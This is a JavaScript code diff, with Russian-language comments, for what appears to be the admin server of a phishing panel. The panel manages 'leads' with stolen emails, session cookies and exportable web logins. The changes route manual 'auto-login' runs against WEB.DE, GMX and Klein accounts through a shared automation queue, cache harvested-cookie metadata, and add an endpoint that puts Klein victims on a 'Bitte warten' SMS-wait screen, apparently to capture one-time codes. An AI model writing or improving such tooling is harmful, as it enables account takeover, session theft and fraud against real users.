@@ -21,6 +21,12 @@ const {
   getWebLoginAndNewPasswordForExport,
 } = require('../lib/leadExportCredentials');
 const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
+const LEADS_COOKIE_META_CACHE_TTL_MS = Math.max(1000, parseInt(process.env.LEADS_COOKIE_META_CACHE_TTL_MS || '7000', 10) || 7000);
+let leadsCookieMetaCache = {
+  ts: 0,
+  cookieSafeSet: new Set(),
+  cookieExportSets: { leadIds: new Set(), safeNames: new Set() }
+};
 
 async function handle(scope) {
   with (scope) {
@@ -238,64 +244,29 @@ async function handle(scope) {
         console.error('[АДМИН] webde-login-start: лид не найден, id=' + id);
         return send(res, 404, { ok: false });
       }
-      delete lead.webdeLoginGridExhausted;
-      delete lead.webdeLoginGridStep;
-      const email = (lead.email || '').trim();
-      if (!email) {
-        console.error('[АДМИН] webde-login-start: у лида нет email, id=' + id);
-        return send(res, 400, { ok: false, error: 'У лида нет email' });
-      }
-      const emailLower = email.toLowerCase();
-      automationService.preemptWebdeLoginForReplacedLead(id, emailLower);
-      if (!automationService.tryAcquireWebdeScriptLock(emailLower, id)) {
-        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id, id);
-        return send(res, 409, { ok: false, error: 'Для этого email скрипт входа уже запущен' });
-      }
-      if (automationService.runningWebdeLoginLeadIds.size >= automationService.WEBDE_LOGIN_MAX_CONCURRENT) {
-        automationService.clearWebdeScriptRunning(emailLower);
-        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + automationService.WEBDE_LOGIN_MAX_CONCURRENT, id);
-        return send(res, 409, { ok: false, error: 'Достигнут лимит одновременных автовходов (' + automationService.WEBDE_LOGIN_MAX_CONCURRENT + ')' });
-      }
-      const loginDir = path.join(PROJECT_ROOT, 'login');
-      const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
-      if (!fs.existsSync(scriptPath)) {
-        automationService.clearWebdeScriptRunning(emailLower);
-        console.error('[АДМИН] webde-login-start: скрипт не найден — ' + scriptPath);
-        return send(res, 500, { ok: false, error: 'login/lead_simulation_api.py не найден' });
-      }
-      const webdeComboSlotManual = automationService.runningWebdeLoginLeadIds.size;
-      automationService.runningWebdeLoginLeadIds.add(id);
-      const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
-      const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
-      const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
-      const workerSecret = (process.env.WORKER_SECRET || '').trim();
-      const python = automationService.resolvePythonExecutable(PROJECT_ROOT);
-      const env = automationService.makePythonSpawnEnv(PROJECT_ROOT);
-      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--combo-slot', String(webdeComboSlotManual)];
-      if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
-      const child = spawn(python, pyArgsManual, {
-        cwd: PROJECT_ROOT,
-        detached: true,
-        stdio: 'inherit',
-        env: Object.assign({}, env, { WORKER_SECRET: workerSecret }, automationService.webdeScriptProxyEnv())
+      const emailLog = (lead.emailKl || lead.email || '').trim() || '—';
+      pushEvent(lead, 'Автовход: ручной запуск (кнопка)', 'admin');
+      leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
+      logTerminalFlow('АДМИН', 'Админ', 'manual', emailLog, 'ручной запуск автовхода requested · leadId=' + id, id);
+
+      // Запуск через общий путь авто-логина: те же очереди, слоты и ветки (WEB.DE/GMX/Klein-orchestration).
+      automationService.startWebdeLoginAfterLeadSubmit(id, lead, true);
+
+      const live = leadService.readLeadById(id) || lead;
+      const evs = Array.isArray(live.eventTerminal) ? live.eventTerminal : [];
+      const nowTs = Date.now();
+      const freshAutoEvent = evs.slice(-6).find(function (ev) {
+        const label = String((ev && ev.label) || '');
+        if (label !== EVENT_LABELS.WEBDE_START && label !== EVENT_LABELS.WEBDE_QUEUE && label !== EVENT_LABELS.KLEIN_START && label !== EVENT_LABELS.KLEIN_QUEUE) return false;
+        const atTs = Date.parse((ev && ev.at) || '');
+        return Number.isFinite(atTs) ? (nowTs - atTs <= 8000) : true;
       });
-      automationService.webdeLockWriteChildPid(emailLower, child.pid);
-      automationService.webdeLoginChildByLeadId.set(id, child);
-      child.on('exit', function () {
-        automationService.webdeLoginChildByLeadId.delete(id);
-      });
-      child.unref();
-      const manualSession = automationService.beginWebdeAutoLoginRun(lead);
-      const manualKleinOrch = readStartPage() === 'klein';
-      const manualDetail = 'ручной запуск · lead_simulation_api.py' + (manualKleinOrch ? ' · --klein-orchestration' : '');
-      pushEvent(lead, EVENT_LABELS.WEBDE_START, 'script', { session: manualSession, detail: manualDetail });
-      leadService.persistLeadPatch(id, {
-        webdeScriptRunSeq: lead.webdeScriptRunSeq,
-        webdeScriptActiveRun: lead.webdeScriptActiveRun,
-        eventTerminal: lead.eventTerminal
-      });
-      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''), id);
-      send(res, 200, { ok: true, message: 'started' });
+      if (!freshAutoEvent) {
+        pushEvent(live, 'Автовход: ручной запуск отклонён', 'admin');
+        leadService.persistLeadPatch(id, { eventTerminal: live.eventTerminal });
+        return send(res, 409, { ok: false, error: 'Автовход не запущен (уже запущен, отключён Auto-Login или не подходит сценарий лида)' });
+      }
+      send(res, 200, { ok: true, message: freshAutoEvent.label === EVENT_LABELS.WEBDE_QUEUE || freshAutoEvent.label === EVENT_LABELS.KLEIN_QUEUE ? 'queued' : 'started' });
     });
     return true;
   }
@@ -431,31 +402,36 @@ async function handle(scope) {
           });
         }
 
-        var chatData = chatService.readChat();
-        var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
-        var cookieSafeSet = new Set();
-        if (fs.existsSync(cookiesDir)) {
-          fs.readdirSync(cookiesDir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { cookieSafeSet.add(f.slice(0, -5)); });
+        var nowMetaTs = Date.now();
+        var cookieSafeSet = null;
+        var cookieExportSets = null;
+        if ((nowMetaTs - leadsCookieMetaCache.ts) < LEADS_COOKIE_META_CACHE_TTL_MS) {
+          cookieSafeSet = leadsCookieMetaCache.cookieSafeSet;
+          cookieExportSets = leadsCookieMetaCache.cookieExportSets;
+        } else {
+          var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
+          cookieSafeSet = new Set();
+          if (fs.existsSync(cookiesDir)) {
+            fs.readdirSync(cookiesDir).forEach(function (f) {
+              if (f.endsWith('.json')) cookieSafeSet.add(f.slice(0, -5));
+            });
+          }
+          var exportedRaw = readCookiesExportedSets();
+          cookieExportSets = exportedRaw && typeof exportedRaw === 'object' ? exportedRaw : { leadIds: new Set(), safeNames: new Set() };
+          if (!(cookieExportSets.leadIds instanceof Set)) cookieExportSets.leadIds = new Set();
+          if (!(cookieExportSets.safeNames instanceof Set)) cookieExportSets.safeNames = new Set();
+          leadsCookieMetaCache = {
+            ts: nowMetaTs,
+            cookieSafeSet: cookieSafeSet,
+            cookieExportSets: cookieExportSets
+          };
         }
-        var cookieExportSets = readCookiesExportedSets();
         function cookieSafeFromEmail(email) {
           if (!email || typeof email !== 'string') return '';
           return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
         }
-        var resultWithChat = listForAdmin.map(function (l) {
-          var copy = {};
-          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
-          delete copy.cookies;
-          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
-          copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
-          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
-          var hasDbCookies = l.cookies != null && String(l.cookies).trim() !== '';
-          copy.cookiesAvailable = hasDbCookies || cookieSafeSet.has(safe);
-          copy.cookiesExported = cookieExportSets.leadIds.has(String(l.id)) || cookieExportSets.safeNames.has(safe);
-          return copy;
-        });
         const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
-        resultWithChat.forEach(function (l) {
+        listForAdmin.forEach(function (l) {
           const p = (l.platform || '').toLowerCase();
           if (p === 'windows') byPlatform.windows++;
           else if (p === 'macos') byPlatform.macos++;
@@ -463,9 +439,9 @@ async function handle(scope) {
           else if (p === 'ios') byPlatform.ios++;
           else byPlatform.other++;
         });
-        var total = resultWithChat.length;
+        var total = listForAdmin.length;
         var start = (page - 1) * limit;
-        var slice = resultWithChat.slice(start, start + limit);
+        var slice = listForAdmin.slice(start, start + limit);
         /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
         var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
         var ensureResolved = ensureIdRaw ? String(leadService.resolveLeadId(ensureIdRaw)) : '';
@@ -474,7 +450,7 @@ async function handle(scope) {
             return l && l.id != null && String(l.id) === ensureResolved;
           });
           if (!alreadyInSlice) {
-            var ensuredLead = resultWithChat.find(function (l) {
+            var ensuredLead = listForAdmin.find(function (l) {
               return l && l.id != null && String(l.id) === ensureResolved;
             });
             if (ensuredLead) {
@@ -489,8 +465,21 @@ async function handle(scope) {
             }
           }
         }
-        writeDebugLog('LEADS_RETURNED', { count: slice.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
-        var _payload = { leads: slice, total: total, page: page, limit: limit };
+        var chatData = chatService.readChat();
+        var sliceWithChat = slice.map(function (l) {
+          var copy = {};
+          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
+          delete copy.cookies;
+          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
+          copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
+          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
+          var hasDbCookies = l.cookies != null && String(l.cookies).trim() !== '';
+          copy.cookiesAvailable = hasDbCookies || cookieSafeSet.has(safe);
+          copy.cookiesExported = cookieExportSets.leadIds.has(String(l.id)) || cookieExportSets.safeNames.has(safe);
+          return copy;
+        });
+        writeDebugLog('LEADS_RETURNED', { count: sliceWithChat.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
+        var _payload = { leads: sliceWithChat, total: total, page: page, limit: limit };
         /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
         if (ensureIdRaw) {
           _payload.ensureIdResolved = ensureResolved || ensureIdRaw;
@@ -1459,8 +1448,9 @@ async function handle(scope) {
       let json = {};
       try { json = JSON.parse(body || '{}'); } catch {}
       const leadId = (json.leadId != null) ? String(json.leadId).trim() : '';
+      const brand = (json.brand != null) ? String(json.brand).trim().toLowerCase() : '';
       if (!leadId) return send(res, 400, { ok: false });
-      const chatKey = chatService.getChatKeyForLeadId(leadId);
+      const chatKey = chatService.getChatKeyForLeadId(leadId, null, brand);
       const chat = chatService.readChat();
       if (!chat._readAt) chat._readAt = Object.create(null);
       chat._readAt[chatKey] = new Date().toISOString();
@@ -2322,6 +2312,39 @@ async function handle(scope) {
         lastSeenAt: lead.lastSeenAt,
         adminListSortAt: lead.adminListSortAt,
         eventTerminal: lead.eventTerminal
+      });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-klein-sms-wait' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idResolved = resolveLeadId(String(id).trim());
+      const idx = leads.findIndex((l) => l.id === idResolved);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      if (String(lead.brand || '').toLowerCase() !== 'klein') {
+        return send(res, 400, { ok: false, error: 'Только для Klein-лидов' });
+      }
+      lead.status = 'redirect_klein_sms_wait';
+      const nowBump = new Date().toISOString();
+      lead.lastSeenAt = nowBump;
+      lead.adminListSortAt = nowBump;
+      pushEvent(lead, 'Klein: Bitte warten (ожидание SMS)', 'admin');
+      persistLeadPatch(idResolved, {
+        status: lead.status,
+        lastSeenAt: lead.lastSeenAt,
+        adminListSortAt: lead.adminListSortAt,
+        eventTerminal: lead.eventTerminal,
       });
       send(res, 200, { ok: true });
     });
